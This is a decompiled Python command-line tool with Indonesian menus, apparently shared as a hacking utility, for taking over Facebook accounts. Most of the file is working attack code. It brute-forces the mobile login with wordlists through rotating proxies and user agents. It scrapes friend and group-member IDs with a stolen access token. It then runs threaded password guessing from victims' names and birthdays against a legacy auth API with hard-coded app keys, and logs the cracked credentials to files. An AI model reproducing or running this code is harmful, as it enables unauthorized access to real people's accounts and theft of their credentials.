# uncompyle6 version 3.3.4
# Python bytecode 3.7
# Decompiled from: Python 3.7.3 (default, Apr 24 2019, 11:21:56) 
# [Clang 8.0.2 (https://android.googlesource.com/toolchain/clang 40173bab62ec7462
r"""    ___  ____ ___  ____ ____    ____ ____ ____ ____ ___  ____ 
       |__] |___ |__] |__| [__     |__/ |___ |    |  | |  \ |___ 
       |__] |___ |__] |  | ___]    |  \ |___ |___ |__| |__/ |___ """
from multiprocessing.pool import ThreadPool
from getpass import getpass
import os, urllib.request, sys, json, time, hashlib, random, shutil, re, threading
from crayons import *
from bs4 import BeautifulSoup
try:
    import mechanize, requests
except ImportError:
    os.system('pip install mechanize')
    os.system('pip install requests')

sleep = time.sleep
h = '\x1b[32m'
r = '\x1b[1;91m'
k = '\x1b[1;97m'
n = '\x1b[94m'
time.sleep(1)
back = 0
idd = []
threads = []
berhasil = []
cekpoint = []
gagal = []
idb = []
listgrup = []
id = []
s = '                    Selamat Menikmati'
t = '                         Token'
m = '                 Multibruteforce Facebook'
user_agent_list = [
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)']
proxies_list = [
 'http://10.10.1.10:3128',
 'http://77.232.139.200:8080',
 'http://78.111.125.146:8080',
 'http://77.239.133.146:3128',
 'http://74.116.59.8:53281',
 'http://67.53.121.67:8080',
 'http://67.78.143.182:8080',
 'http://62.64.111.42:53281',
 'http://62.210.251.74:3128',
 'http://62.210.105.103:3128',
 'http://5.189.133.231:80',
 'http://46.101.78.9:8080',
 'http://45.55.86.49:8080',
 'http://40.87.66.157:80',
 'http://45.55.27.246:8080',
 'http://45.55.27.246:80',
 'http://41.164.32.58:8080',
 'http://45.125.119.62:8080',
 'http://37.187.116.199:80',
 'http://43.250.80.226:80',
 'http://43.241.130.242:8080',
 'http://38.64.129.242:8080',
 'http://41.203.183.50:8080',
 'http://36.85.90.8:8080',
 'http://36.75.128.3:80',
 'http://36.81.255.73:8080',
 'http://36.72.127.182:8080',
 'http://36.67.230.209:8080',
 'http://35.198.198.12:8080',
 'http://35.196.159.241:8080',
 'http://35.196.159.241:80',
 'http://27.122.224.183:80',
 'http://223.206.114.195:8080',
 'http://221.120.214.174:8080',
 'http://223.205.121.223:8080',
 'http://222.124.30.138:80',
 'http://222.165.205.204:8080',
 'http://217.61.15.26:80',
 'http://217.29.28.183:8080',
 'http://217.121.243.43:8080',
 'http://213.47.184.186:8080',
 'http://207.148.17.223:8080',
 'http://210.213.226.3:8080',
 'http://202.70.80.233:8080']
sleep(0.2)
os.system('clear')

def tik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)


print(k)

def logo():
    tik(red('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!', bold=True))
    print(red('      ╔═╗                  ╔═╗╔╗', bold=True))
    print(red('      ║╔╝                  ║╔╝║║', bold=True))
    print(red('     ╔╝╚╗╔══╗╔═╗╔══╗╔══╗  ╔╝╚╗║╚═╗  Author : As_Min', bold=True))
    print(k + '     ╚╗╔╝║╔╗║║╔╝║╔═╝║║═╣  ╚╗╔╝║╔╗║  Github : asmin19')
    print('      ║║ ║╚╝║║║ ║╚═╗║║═╣   ║║ ║╚╝║  Versi  : 2.0')
    print('      ╚╝ ╚══╝╚╝ ╚══╝╚══╝   ╚╝ ╚══╝')
    print('###########################################################')


a = '==========================================================='

def menu():
    print('>> buat_wordlist\n>> bruteforce_fb\n>> multibruteforce_facebook\n>> token\n>> keluar')
    try:
        asm = input(red(']>> As_Min >> ', bold=True) + k)
        if asm.lower() == 'buat_wordlist':
            word()
        else:
            if asm.lower() == 'bruteforce_fb':
                crack()
            else:
                if asm.lower() == 'multibruteforce_facebook':
                    mbf()
                else:
                    if asm.lower() == 'token':
                        token()
                    else:
                        if asm.lower() == 'keluar':
                            keluar()
                        else:
                            tik('[!] Anda Salah Memasukkan Input')
                            input('[+] Tekan [Enter] Untuk Kembali')
                            os.system('clear')
                            logo()
                            print(s)
                            print(a)
                            menu()
    except ValueError:
        tik('[!] Masukkan Pilihan Anda')
        input('[+] Tekan [Enter] Untuk Kembali')
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()
    except EOFError:
        keluar()


def word():
    os.system('clear')
    logo()
    print('               Membuat Wordlist')
    print(a)
    try:
        print('[+] Selamat Datang di Program Membuat Wordlist Sederhana\n    Jika Ingin Memerlukan Bantuan untuk\n    Membuat Wordlist Tertarget,\n    Anda bisa Menghubungi Author : +6285268345036\n[!] Simpan File dengan extensi (.txt),\n    Example: Password.txt')
        pas = input('[?] Masukkan Nama File: ')
        wordlist = []
        tik('[+] press [Enter], Jika Anda merasa Cukup Membuat Wordlist\n[+] Press [Ctrl + d] Untuk Membatalkan')
        while True:
            lis = input('[?] Input Wordlist: ')
            if len(lis) >= 1:
                wordlist.append(lis)
            else:
                with open(pas, 'w') as (berkas):
                    for i in wordlist:
                        berkas.write(i + '\n')

                    tik('[+] Wordlist Tersimpan Dengan Nama ' + pas)
                    input('[+] Tekan [Enter] Untuk Kembali ')
                    os.system('clear')
                    logo()
                    print(s)
                    print(a)
                    menu()
                break

    except FileNotFoundError:
        tik('[!] Anda Tidak Menulis Nama file')
        word()
    except EOFError:
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()


def crack():
    try:
        os.system('clear')
        logo()
        print('                   Bruteforce Fb')
        print(k)
        URL = 'https://m.facebook.com/login'
        tik('Example : asmin987asmin@gmail.com\n          Atau Menggunakan No Hp/Id')
        email = input('[?] Masukkan Email/Id/No.Hp Korban : ')
        sleep(0.2)
        sandi = input('[?] Masukkan file wordlist (contoh : Password.txt) : ')
        passw = open(sandi, 'r')
        print('[+] Memulai proses..')
        for password in passw:
            form_data = {'email':email,  'pass':password}
            user_agent = random.choice(user_agent_list)
            headers = {'User-Agent': user_agent}
            proxies_a = random.choice(proxies_list)
            proxies = {'http': proxies_a}
            with requests.Session() as (c):
                c.get(URL, headers=headers, proxies=proxies)
                r = c.post(URL, data=form_data, headers=headers, proxies=proxies)
                b = c.get('https://m.facebook.com/home.php', headers=headers, proxies=proxies)
            soup = BeautifulSoup(b.content, 'html.parser')
            a = soup.find('title')
            if str(a) == '<title>Masuk Facebook | Facebook</title>':
                print('Mencoba', password, end='', flush=True)
                print('\r', end='', flush=True)
            else:
                print('Mencoba', password, end='', flush=True)
                sleep(1)
                print('Login Succes\n')
                print('Password Adalah ' + password)
                exit()
                print(sandi + ' Habis Silahkan Coba Lagi')

    except FileNotFoundError:
        tik('[×] File Tidak DiTemukan')
        input('[+] Tekan [Enter] untuk kembali')
        os.system('clear')
        logo()
        crack()
    except requests.exceptions.ConnectionError:
        tik('[×] Tidak Ada Koneksi!!')
        exit()


def mbf():
    try:
        os.system('clear')
        logo()
        print(m)
        print(a)
        print('>> dump_id\n>> daftar_group\n>> dump_id_teman\n>> crack_dari_teman\n>> crack_dari_group\n>> kembali')
        Min = input(blue(']>> multibruteforce_facebook >> ', bold=True) + k)
        if Min.lower() == 'dump_id_teman':
            idf()
        else:
            if Min.lower() == 'daftar_group':
                gruplist()
            else:
                if Min.lower() == 'dump_id_teman':
                    idff()
                else:
                    if Min.lower() == 'crack_dari_teman':
                        teman()
                        hasil()
                    else:
                        if Min.lower() == 'crack_dari_group':
                            crack_grup()
                        else:
                            if Min.lower() == 'kembali':
                                os.system('clear')
                                logo()
                                print(s)
                                print(a)
                                menu()
                            else:
                                print('[!] Pilihan tak Tersedia')
                                input('[!] Tekan [Enter] Untuk Kembali ')
                                logo()
                                print(m)
                                print(a)
                                mbf()
    except ValueError:
        tik('[!] Please! Masukkan Pilihan Anda!')
        input('[!] Tekan [Enter] Untuk Kembali ')
        mbf()
    except EOFError:
        keluar()


def idf():
    tik('[*] Memuat Token...')
    sleep(2)
    try:
        token = open('cookie/login.txt', 'r').read()
        print('[*] Token Ditemukan')
    except IOError:
        print('[!] Token Tak Ditemukan')
        os.remove('cookie/login.txt')
        toke()

    tik('[*] Memulai Proses....')
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        a = json.loads(r.text)
        fule = input('Simpan File Dengan Nama (akhiran harus.txt) : ')
        out = open(fule, 'w')
        for i in a['data']:
            idd.append(i['id'])
            out.write(i['id'] + '\n')
            print('Nama : ' + i['name'])
            print('ID   : ' + i['id'])

        out.close()
        tik('\r[*] Sukses Mendapatkan ID teman')
        tik('[*] File Tersimpan Dengan Nama : ' + fule)
        print('[+] Jumlah ID ' + str(len(idd)))
        input('[+] Tekan [Enter] Untuk Kembali ')
        mbf()
    except KeyboardInterrupt:
        tik('\r[!] Terhenti')
        exit()
    except KeyError:
        tik('[!] Gagal Mendapatkan ID teman')
        input('[+] Tekan [Enter] untuk kembali ')
        mbf()
    except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
        print('[!] Tidak Ada Koneksi')
        tik('[!] Terhenti')
        exit()


def hasil():
    global berhasil
    global cekpoint
    global gagal
    print('')
    print('===========================')
    for b in berhasil:
        print(b)

    for c in cekpoint:
        print(c)

    print
    print('[x] Gagal --> ' + str(len(gagal)))
    print('===============================')
    a = input('[+] Mau Coba Lagi? [y/n] : ')
    if a.lower() == 'y' or a.upper() == 'Y':
        pass
    try:
        os.system('clear')
        logo()
        teman()
    except OSError:
        print('[!] Anda Salah Memasukkan Input')
        exit()


def crack_grup():
    tik('[*] Memuat Token...')
    sleep(2)
    try:
        toket = open('cookie/login.txt', 'r').read()
        print('[*] Token Ditemukan')
    except IOError:
        tik('[!] Token Tak Ditemukan')
        os.remove('cookie/login.txt')
        toke()

    print('=======================')
    idg = input('[?] ID Grup : ')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
        asw = json.loads(r.text)
        print('[+] Nama grup : ' + asw['name'])
    except KeyError:
        print('[!] Grup tidak ditemukan')
        input('[+] Tekan [Enter] untuk kembali')
        mbf()

    re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    s = json.loads(re.text)
    for i in s['data']:
        id.append(i['id'])

    print('[+] Jumlah ID : ' + str(len(id)))
    print('============================')
    tik('[!] Memulai Proses...')
    print('======================')

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print('[OK]  --> ' + user + ' | ' + pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print('[CP]  --> ' + user + ' | ' + pass1)
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print('[OK]  --> ' + user + ' | ' + pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print('[CP]  --> ' + user + ' | ' + pass2)
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print('[OK]  --> ' + user + ' | ' + pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print('[CP]  --> ' + user + ' | ' + pass3)
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print('[OK]  --> ' + user + ' | ' + pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print('[CP]  --> ' + user + ' | ' + pass4)
                                        else:
                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=sayang&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print('[OK]  --> ' + user + ' | sayang')
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print('[CP]  --> ' + user + ' | sayang')
                                                else:
                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=password&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print('[OK]  --> ' + user + ' | password')
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print('[CP]  --> ' + user + ' | password')
                                                        else:
                                                            pass5 = b['name'] + '123'
                                                            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print('[OK]  --> ' + user + ' | ' + pass5)
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print('[CP]  --> ' + user + ' | ' + pass5)
                                                                else:
                                                                    pass6 = b['name']
                                                                    data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print('[OK]  --> ' + user + ' | ' + pass6)
                                                                    else:
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print('[CP]  --> ' + user + ' | ' + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print('[+] Selesai')
    input('[+] Tekan [Enter] untuk kembali')
    mbf()


def idff():
    try:
        tik('[!] Memuat Token....')
        sleep(2)
        toket = open('cookie/login.txt', 'r').read()
        print('[+] Token Ditemukan')
    except IOError:
        tik('[!] Token tidak ditemukan')
        os.system('rm -rf cookie/login.txt')
        time.sleep(1)
        logo()
        print(t)
        print(a)
        toke()
    else:
        try:
            tik('======================')
            idt = input('[+] Masukan ID Teman : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print('[+] ID Dari: ' + op['name'])
            except KeyError:
                print('[!] Anda Belum Berteman Dengan ' + op['name'])
                input('[+] Tekan [Enter] Untuk Kembali ')
                mbf()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = input('[?] Simpan File (akhiran harus.txt) : ')
            bz = open(save_idt, 'w')
            print('[+] Memulai Proses....')
            tik('======================')
            for ah in z['friends']['data']:
                idb.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print('Nama : ' + ah['name'])
                print('ID   : ' + ah['id'])

            print('[+] Jumlah ID ' + str(len(idb)))
            print('[+] File tersimpan : ' + save_idt)
            bz.close()
            input('[+] Tekan [Enter] untuk kembali')
            mbf()
        except KeyError:
            print('[×] Anda Belum Berteman Dengan ' + op['name'])
            input('[+] Tekan [Enter] Untuk Kembali ')
            mbf()
        except (KeyboardInterrupt, EOFError):
            print('[!] Terhenti')
            input('[!] Tekan [Enter] Untuk Kembali ')
            mbf()
        except requests.exceptions.ConnectionError:
            tik('[!] Tidak ada koneksi')
            exit()
        except IOError:
            print('[!] Kesalahan saat membuat file')
            input('[!] Tekan [Enter] Untuk Kembali ')
            mbf()


def teman():
    global file
    global idlist
    global passw
    try:
        tik('[+] Memuat Token....')
        print('[+] Token Ditemukan..')
        fail = open('cookie/login.txt', 'r').read()
    except IOError:
        tik('[!] Token tidak ditemukan')
        os.system('rm -rf cookie/login.txt')
        time.sleep(1)
        logo()
        print(t)
        print(a)
        toke()
    else:
        tik('=======================')
        idlist = input('[?] File ID   : ')
        passw = input('[?] Password  : ')
        try:
            file = open(idlist, 'r')
            tik('[!] Memulai Proses......')
            for x in range(40):
                As = threading.Thread(target=scrak, args=())
                As.start()
                threads.append(As)

            for As in threads:
                As.join()

        except IOError:
            print('[!] File tidak ditemukan')
            input('[+] Tekan [Enter] Untuk Kembali ')
            os.system('clear')
            logo()
            print(s)
            print(a)
            mbf()


def scrak():
    global back
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.request.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'a')
                bisa.write('ID dari : ' + idlist + '\n')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOKâ\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('Cekpoint.txt', 'a')
                cek.write('ID dari : ' + idlist + '\n')
                cek.write(username + ' | ' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[1;97m[\x1b[1;93mCPâ\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                gagal.append(username)
                back += 1
                sys.stdout.write('\r[+] Menemukan Password : ' + passw + '\x1b[1;91m\x1b[1;97m ' + str(back) + '\x1b[1;96m>\x1b[1;97m' + str(len(up)) + ' Ok > ' + str(len(berhasil)) + ' Cp > ' + str(len(cekpoint)))
                sys.stdout.flush()

    except IOError:
        print('\n[!] Koneksi terganggu')
        sleep(0.0001)
    except ConnectionError:
        print(' Tidak ada koneksi')


def token():
    try:
        os.system('clear')
        logo()
        print(t)
        print(a)
        print('>> token\n>> hapus_token\n>> kembali\n                ')
        pilihan = input(blue('Token >> ', bold=True) + k)
        if pilihan.lower() == 'token':
            toke()
        else:
            if pilihan.lower() == 'hapus_token':
                hapus()
            else:
                if pilihan.lower() == 'kembali':
                    os.system('clear')
                    logo()
                    print(s)
                    print(a)
                    menu()
                else:
                    tik('[!] Pilihan tidak Tersedia')
                    input('[+] Press [Enter] Untuk Kembali')
                    os.system('clear')
                    logo()
                    print(t)
                    print(a)
                    token()
    except ValueError:
        tik('[!] Please! Masukkan Pilihan Anda!')
        input('[+] Tekan [Enter] Untuk Kembali')
        os.system('clear')
        logo()
        print(t)
        print(a)
        token()


def toke():
    try:
        os.mkdir('cookie')
    except OSError:
        pass

    try:
        print('\n[!] Login akun Facebook')
        id = input('[?] Username   : ')
        pwd = getpass('[?] Kata Sandi : ')
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {'api_key':'882a8490361da98702bf97a021ddc14d',  'credentials_type':'password',  'email':id,  'format':'JSON',  'generate_machine_id':'1',  'generate_session_cookies':'1',  'locale':'en_US',  'method':'auth.login',  'password':pwd,  'return_ssl_resources':'0',  'v':'1.0'}
        sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET).encode('utf-8')
        tik('[!] Memulai Proses...')
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig': x.hexdigest()})
        requ = requests.get('https://api.facebook.com/restserver.php', params=data, headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'})
        res = requ.json()['access_token']
        o = open('cookie/login.txt', 'w')
        o.write(res)
        tik('[!] Sukses Mendapatkan Token')
        print('[!] Akses Token Anda Tersimpan Di cookie/login.txt')
        time.sleep(3)
        o.close()
        login()
    except KeyError:
        print('[!] Gagal Mendapatkan Akses Token')
        tik('[!] Cek Username/Password Anda')
        exit()
    except requests.exceptions.ConnectionError:
        tik('[!] Tidak Ada Koneksi !!')
        exit()
    except (KeyboardInterrupt, EOFError):
        exit('\n[!] Paksa Keluar.')
    except Exception as F:
        try:
            exit('[Error] %s' % F)
        finally:
            F = None
            del F


def gruplist():
    try:
        tik('[+] Memuat Token...')
        sleep(2)
        toket = open('cookie/login.txt', 'r').read()
        print('[+] Token Ditemukan')
    except IOError:
        print('[!] Token tidak ditemukan')
        os.system('rm -rf cookie/login.txt')
        sleep(1)
        toke()
    else:
        print('[!] Memulai Proses....')
        tik('======================')
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'a')
                listgrup.append(id)
                f.write('Nama : ' + nama + '\n')
                f.write('ID   : ' + id + '\n')
                print('[+] Nama  : ' + str(nama))
                print('[+] ID    : ' + str(id))

            print('[+] Jumlah Grup %s' % len(listgrup))
            print('[+] Tersimpan : grupid.txt')
            f.close()
            input('[!] Tekan [Enter] Untuk Kembali ')
            mbf()
        except (KeyboardInterrupt, EOFError):
            print('[!] Terhenti')
            input('[+] Tekan [Enter] untuk kembali')
            mbf()
        except KeyError:
            os.remove('grupid.txt')
            print('[!] Grup tidak ditemukan')
            input('[+] Tekan [Enter] untuk kembali ')
            mbf()
        except requests.exceptions.ConnectionError:
            print('[!] Tidak ada koneksi')
            exit()
        except IOError:
            print('[!] Kesalahan saat membuat file')
            input('[+] Tekan [Enter] untuk kembali ')
            mbf()


def hapus():
    a = input("[×] Type 'delete' to continue: ")
    if a.lower() == 'delete':
        try:
            os.system('rm -rf cookie/login.txt')
            tik('[+] Sukses Menghapus')
            input('[+] Tekan [Enter] Untuk Kembali ')
            os.system('clear')
            logo()
            print(s)
            menu()
        except OSError:
            tik('[!] Gagal Menghapus Token')
            input('[+] Tekan [Enter] untuk kembali ')
            os.system('clear')
            logo()
            print(s)
            print(a)
            menu()

    else:
        tik('[!] Gagal Menghapus Token...')
        input('[+] Tekan [Enter] untuk kembali ')
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()


def keluar():
    tik(h + 'Terima kasih Sudah Menggunakan Tools ini\nBuat Harimu Menyenangkan 😊')
    exit()


def login():
    try:
        os.system('clear')
        open('cookie/login.txt', 'r').read()
        os.system('clear')
        logo()
        print(s)
        print(a)
        menu()
    except IOError:
        logo()
        toke()
    except requests.exceptions.ConnectionError:
        tik('[×] Tidak ada koneksi !!')


login()